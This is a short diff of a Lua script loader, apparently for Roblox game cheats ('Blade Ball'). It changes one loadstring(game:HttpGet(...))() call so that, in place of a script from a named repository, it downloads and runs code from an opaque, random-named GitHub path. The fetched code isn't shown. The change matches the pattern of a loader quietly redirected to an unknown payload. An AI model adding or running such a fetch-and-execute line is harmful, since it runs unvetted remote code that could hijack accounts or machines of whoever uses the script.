@@ -3,7 +3,7 @@ local function s1()
 end 
 
 local function s2() 
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/vylerascripts/vylera-scripts/main/vylerabladeball.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/bvfjaj/ckjdzdhh/refs/heads/main/cjc"))()
 end 
 
 local function s3() 
